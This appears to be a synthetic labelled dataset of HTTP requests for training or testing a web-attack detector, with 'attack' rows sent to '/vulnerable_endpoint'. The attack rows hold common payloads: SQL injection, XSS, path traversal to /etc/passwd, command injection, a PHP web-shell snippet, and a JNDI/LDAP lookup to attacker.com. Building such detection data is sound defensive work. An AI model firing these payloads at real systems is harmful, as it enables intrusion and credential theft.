id,timestamp,method,path,http_headers,body,label
2d2b2dcb-b221-4195-af7c-3f575b2818d8,2026-02-25 04:15:27,POST,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
199cad63-a5fa-4bc8-ba79-8af9a4845af8,2026-02-24 23:03:28,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
3a9ce4f9-9604-4647-9122-e6625b1b3dc2,2026-02-24 22:43:55,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
d3434543-c518-4170-9f6c-0f02b4bd8b01,2026-02-24 14:47:33,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: curl/7.68.0,|| ping -c 4 127.0.0.1 ||,attack
52ddd9bf-06a1-4aa1-a94e-3d80d243b518,2026-02-24 15:53:40,POST,/products?id=123,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
4a7b8ffa-40ae-4323-85df-18d0d10b8363,2026-02-24 22:32:47,GET,/home,User-Agent: Chrome/120.0.0.0,,normal
c6a8119c-c100-402c-b608-093137780b46,2026-02-24 18:57:29,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
b5abe260-fbd2-45ae-a1a8-31e86c094689,2026-02-25 10:15:03,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
954f8cfc-c9c4-4287-a354-dabe3155310d,2026-02-25 06:06:02,GET,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
bdc548e9-c175-4f8a-99a2-30cf081594f7,2026-02-24 12:42:13,POST,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
f60f5220-4bed-467f-b91b-620e57f18946,2026-02-24 19:42:17,POST,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
6c0bad62-3bd1-409d-aa1e-ea590c8ba80b,2026-02-25 10:11:16,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
566c2281-8516-43af-83ab-60a560717e96,2026-02-24 15:56:03,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
f0d6afa9-9cba-410c-ab8c-9d35cfeffa25,2026-02-24 09:00:05,POST,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
ece4163f-84e0-4e83-8751-1be28b77f4cd,2026-02-25 04:49:36,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: curl/7.68.0,${jndi:ldap://attacker.com/a},attack
eaf09ed5-0a5c-48e8-9953-6c7d353cdcc2,2026-02-24 07:17:28,POST,/api/v1/orders?status=completed,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
4fcd4163-8aba-419a-a2c4-a79b2ba0e823,2026-02-24 19:05:10,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
544d4c88-e78f-48d7-ae5b-d5b1eb2f8273,2026-02-25 07:02:52,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
d8bdb2bb-3fb1-4fc2-95ba-608102d841b7,2026-02-25 00:34:46,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
84f46b7d-5f34-4f06-a7e6-e2b6945c991e,2026-02-24 09:23:48,GET,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
d1858c15-5845-4b53-835a-714f9402fcea,2026-02-25 10:16:52,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
b8bd2218-ea7c-4958-82b4-0959493600e2,2026-02-25 08:29:21,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: sqlmap/1.6,"UNION SELECT username, password FROM users --",attack
108ea86a-9c05-4fea-bd13-ec7e6b399e29,2026-02-24 19:31:03,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
d458ca59-4d74-4a20-80a4-ca6258ab5bc7,2026-02-25 09:02:38,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
6bbdba30-e898-450b-ad5a-bf4dfe1c5a0e,2026-02-24 23:43:21,POST,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
667977c5-5bce-4149-8779-58d81fffd13c,2026-02-25 06:53:35,GET,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
706ee93e-aaca-4241-8633-771bb21d8a04,2026-02-24 23:36:54,POST,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
c8e76efc-a072-4c31-abd5-0c420bccc7b3,2026-02-24 15:50:07,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
79de09ec-913d-45f9-bf02-99529921ee4c,2026-02-24 21:01:56,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
d4aa9199-bec2-4b50-b801-4aa82259ef2f,2026-02-24 10:02:18,GET,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
cfa84f36-73b6-4e64-a29d-3a397f2cc7f7,2026-02-24 11:31:05,GET,/home,User-Agent: Safari/537.36,,normal
cb504232-a671-4bc3-a3b6-a0120cebc02d,2026-02-25 03:02:11,POST,/checkout,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
36070c5e-1d90-45d4-a82a-2386eab50574,2026-02-25 06:37:39,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: sqlmap/1.6,${jndi:ldap://attacker.com/a},attack
3479ab73-7b9e-456c-92fb-952f349b8898,2026-02-24 16:36:06,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
4b073374-a48e-4380-98a8-eb8ba17f01d5,2026-02-25 02:49:27,POST,/products,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
1746ccc3-0b25-4dd4-a457-50a3851f967e,2026-02-25 02:41:55,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
2e8bf065-e100-4fc4-84b9-603807437268,2026-02-24 19:16:05,POST,/checkout,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
625696af-2fb7-4406-b1ab-7a3b21b672e2,2026-02-25 00:25:09,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
540a3963-179d-4757-8288-107f199514eb,2026-02-24 22:21:35,POST,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
10da25d8-f425-41a3-82bc-0a0db264fb38,2026-02-24 18:37:43,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
4df861dd-fd65-47c3-802a-dc18f80e1483,2026-02-24 08:47:33,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
c22b81be-0ca0-48a8-820e-040e2c214ab5,2026-02-24 12:31:59,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
f809bc74-8c57-4959-927a-5f9938efdc9d,2026-02-25 07:03:09,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
f69451e7-612b-449d-94dd-af89fd95a25e,2026-02-25 05:29:40,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
f0f5b19f-884b-492c-94d2-d8c2744ce313,2026-02-24 09:07:09,GET,/checkout,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
b1d49039-1743-4af0-9b80-5d04afb67464,2026-02-24 11:31:02,GET,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
522a822d-2fc6-4df5-8109-7e98e798b899,2026-02-25 06:16:43,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
52feea08-ead0-4576-9749-e95d2467efd4,2026-02-24 08:19:24,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
cb6a30f0-f713-4ce8-a1fa-05210e44e70d,2026-02-24 15:12:22,POST,/api/v1/users,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
374b2174-cc0a-4c90-ade4-7afe96a9d068,2026-02-25 02:50:02,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
dd3e688f-c3f5-48f1-be9f-05fca0a2d1ee,2026-02-24 21:04:52,POST,/blog/article-1,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
bd3d14fa-720a-44a1-af21-1ca7f01f7975,2026-02-24 16:18:15,GET,/api/v1/orders?status=completed,User-Agent: Safari/537.36,,normal
4b598081-7807-46aa-913f-31216420afa8,2026-02-25 01:08:17,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
e35f8c6c-d52c-46fc-a311-89653266a504,2026-02-24 08:12:10,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<img src=x onerror=alert(1)>,attack
2ce34e0e-3ec9-478b-a08e-9509dfd040d0,2026-02-24 17:23:04,GET,/products?id=123,User-Agent: Chrome/120.0.0.0,,normal
23f57e19-f07b-4331-aad0-30262be1a6f0,2026-02-24 16:23:42,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
6fb9d2cd-8d34-4fcd-a90e-5651e73a3b93,2026-02-24 09:32:10,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
235c1cca-e8e9-46f4-aa4a-ab53a85fadf9,2026-02-24 10:51:26,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
983cc3e3-217d-4487-b53c-56a9572e0dc1,2026-02-25 01:32:11,GET,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
808340ae-69e0-4349-8a73-8e70b4604e22,2026-02-25 09:15:22,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
7ba8ed37-7748-4f51-a158-8a9b3676602b,2026-02-25 06:33:44,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
ea3d5157-2eea-43f8-972e-cc909d2c8cb8,2026-02-24 11:07:42,GET,/products,User-Agent: Chrome/120.0.0.0,,normal
d105c8a3-4d31-4d97-bc5c-cba00e4658cc,2026-02-24 21:14:06,GET,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
ebdcbdb0-9f04-4346-a457-a6d46279b3f6,2026-02-24 22:23:19,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
846f3c93-964e-4205-bfa4-c70b7eda5696,2026-02-25 01:02:53,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
f9a2bfea-1747-4aa1-91b5-c49cb7a9c47a,2026-02-24 11:17:36,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
7a771ae2-28d1-4e14-af9c-999d943c3c67,2026-02-25 09:51:15,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
66c6a89c-5235-4066-9a26-64bbfa25867d,2026-02-24 23:28:39,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
cc097eb3-43d0-4f81-b99a-8253d7a58b6c,2026-02-24 23:40:50,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
d35f7b82-3730-408a-b832-799e11f9e537,2026-02-24 21:21:30,GET,/blog/article-1,User-Agent: Chrome/120.0.0.0,,normal
a623d977-d639-438c-ac4e-5eb0962e79ba,2026-02-25 08:01:53,POST,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
8c276b47-9ed5-484d-a8d6-4ce2fa5e4dcc,2026-02-25 08:19:30,GET,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
a0ae3378-901a-4433-b80d-4f8992205f19,2026-02-25 07:17:31,GET,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
72ec3cb6-830a-4e0d-a662-6ca6d8298aab,2026-02-25 10:05:58,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
9767fb2e-6595-417f-b437-8910b7ee03a5,2026-02-25 04:17:10,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: curl/7.68.0,${jndi:ldap://attacker.com/a},attack
ad26b9d3-4f3f-4248-b453-fbbe74b417e7,2026-02-25 05:12:33,POST,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
80c443aa-4b0c-4c71-ac2f-74765fe5414a,2026-02-25 00:52:12,GET,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
f8af4709-f8e3-4dbd-b944-5c31a5eda3ae,2026-02-24 17:40:58,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
8ff094d8-e25f-4466-8a5b-079ef872d99b,2026-02-24 07:40:36,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
aced8eec-e8d3-499d-b680-bcd485c60af9,2026-02-24 23:52:18,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
f13b4e32-1325-47ad-b2d0-a667c253e38e,2026-02-25 05:07:20,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: curl/7.68.0,/admin?user=admin'--,attack
4dfa9edc-f443-4549-9d79-f37eebc581e3,2026-02-25 01:58:33,POST,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<img src=x onerror=alert(1)>,attack
938893b4-e7cd-4de2-8be4-39c9527c2e85,2026-02-24 22:15:40,GET,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
27e20dbe-a205-47d3-b33f-cfb7c03030c4,2026-02-25 03:45:31,GET,/contact,User-Agent: Safari/537.36,,normal
63ed166a-8324-4a61-9720-35d120b72b96,2026-02-24 22:23:56,POST,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
290d56c8-d338-4c33-be0f-181e2b8b8d4d,2026-02-24 10:24:03,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
d513ce75-36a7-4131-a46a-46ae1e755996,2026-02-24 18:11:56,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
5aafffd2-d28b-47fc-b8bf-273e34013d71,2026-02-25 02:13:09,POST,/blog/article-1,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
396f51f4-55ee-480a-900b-38e33b567e25,2026-02-25 02:13:03,GET,/blog/article-1,User-Agent: Safari/537.36,,normal
010e3125-6f68-42fe-9932-9059de7809ec,2026-02-24 06:45:12,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
5f711e88-a6e9-4d58-8b81-bef76e97f4af,2026-02-25 09:38:47,POST,/checkout,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
19b82090-f3e6-4558-b8dd-84d8333cbe90,2026-02-24 13:46:05,GET,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
18535d97-0bf5-4c18-ad57-0b2498164556,2026-02-24 20:27:26,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: sqlmap/1.6,${jndi:ldap://attacker.com/a},attack
15b8eca9-77a6-4d70-835c-615eecd09865,2026-02-25 04:04:23,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
b0d1de33-b275-4aba-b92c-be67c92a23da,2026-02-24 21:28:30,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
f5404d09-c7b9-4682-8ab6-47eb85f00f8a,2026-02-24 20:44:11,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
c6ec4100-682e-4f37-85ca-331743d765aa,2026-02-25 03:00:06,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
98a84624-7605-44bb-81c8-310f8ac79ad5,2026-02-25 07:51:08,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
6a6d055a-2b68-4755-ae09-98be75fcb4fe,2026-02-25 09:06:40,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Nikto/2.1.6,<script>alert('XSS')</script>,attack
6d876630-36f4-433f-b869-6c03e1984892,2026-02-24 12:33:11,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
3e31716e-be7d-4fde-8eff-7de3c68c4303,2026-02-24 15:07:26,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
830e9099-abc0-4b96-a69c-413b45bd68f4,2026-02-25 07:35:25,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
32cd91d1-ce6b-4755-8f3e-66127b8ce687,2026-02-25 01:00:37,GET,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
412c6b50-12a9-4430-949e-be1d7418c57b,2026-02-25 07:38:49,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
279fc551-3256-4b58-bf5e-141361024236,2026-02-24 18:57:10,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
5f4f8ef7-d9dd-48f3-9d74-d30d13078337,2026-02-24 15:40:51,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
f44b0040-c221-4c9e-b9d2-fc80b282d0d3,2026-02-25 00:55:18,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
bfeba5d7-4e75-4d8c-a6c8-c122679f0e61,2026-02-25 05:38:46,GET,/products,User-Agent: Chrome/120.0.0.0,,normal
1ac8f483-73b9-42c6-937d-38e6af01ba86,2026-02-24 17:56:55,POST,/cart,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
2d79c850-92ee-4c35-a1bc-22dfa4cb30c5,2026-02-24 13:09:30,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
3ab3dfb5-ce37-4ffc-849f-6ddb12867fbb,2026-02-25 04:51:10,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
240b5a20-f06d-41ff-9367-6c6ec2507f66,2026-02-24 11:30:04,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
4000b05b-0748-42f6-8eb9-e372d08bf2c9,2026-02-24 17:11:09,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
b05b668c-d7be-4997-a414-f37ef4896999,2026-02-24 14:38:27,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
fab3b8ac-15c5-44d2-ba44-a92d63f22ec4,2026-02-25 07:22:51,GET,/products?id=123,User-Agent: Safari/537.36,,normal
41e4aa73-07e7-417c-ad7a-1df666004bac,2026-02-24 23:13:48,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
8a0f0c5b-ec69-49d5-86bc-404c5400a963,2026-02-24 18:23:42,GET,/blog/article-1,User-Agent: Chrome/120.0.0.0,,normal
356c2347-0f58-4d3c-9b97-ee32e9ea7fad,2026-02-24 10:35:54,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
a44566b1-8249-49fc-880a-f81cf1a5fdc7,2026-02-24 20:18:12,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
c4b4ada5-bf5f-4e61-aa02-b100977f54e5,2026-02-25 10:18:48,GET,/home,User-Agent: Chrome/120.0.0.0,,normal
f825e213-1317-4892-ae82-bb2eb1a9f84a,2026-02-24 06:42:01,GET,/api/v1/users,User-Agent: Safari/537.36,,normal
001b0c5e-096a-4093-b4a8-289ee31266f3,2026-02-24 11:55:39,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
1408e51e-5284-48ba-93a0-cb86205e225e,2026-02-24 15:45:13,POST,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
ce9828d0-296c-44bc-ab34-38c5ebfc4759,2026-02-25 06:46:16,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Nikto/2.1.6,|| ping -c 4 127.0.0.1 ||,attack
6ea83dd9-c73a-4445-ac27-e8caa4560cb2,2026-02-25 02:12:25,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
40dc2a44-f082-404f-9f53-a11556312eda,2026-02-25 07:14:00,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
b5491ae2-b950-4bcf-8f71-7b0b4fe71218,2026-02-24 13:50:21,GET,/checkout,User-Agent: Safari/537.36,,normal
24eb46d0-6892-4710-8a1e-ede649841ab9,2026-02-24 10:10:28,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
06eb84a8-acc2-4b23-8358-6221e2409148,2026-02-25 08:09:44,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: curl/7.68.0,/admin?user=admin'--,attack
79050331-34e9-471f-a9fb-65cf0346e170,2026-02-25 02:07:27,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
a16a6b52-3460-4e54-aaa1-2c416717a90d,2026-02-24 14:40:15,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
57f9a7f7-ab82-4ca7-bcf4-3dd2c529fefc,2026-02-25 03:52:38,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
e661fbd9-0c18-4759-8a91-32f61fa038b4,2026-02-25 00:45:59,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
2e25cdb1-d56c-4314-9569-a15bb22e1882,2026-02-25 09:39:32,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
9de99212-aeec-43b2-9e47-bcd49ba8bf83,2026-02-24 08:42:46,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
eab28d33-71f0-4e0d-91af-f556f8ed08bb,2026-02-24 15:43:25,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
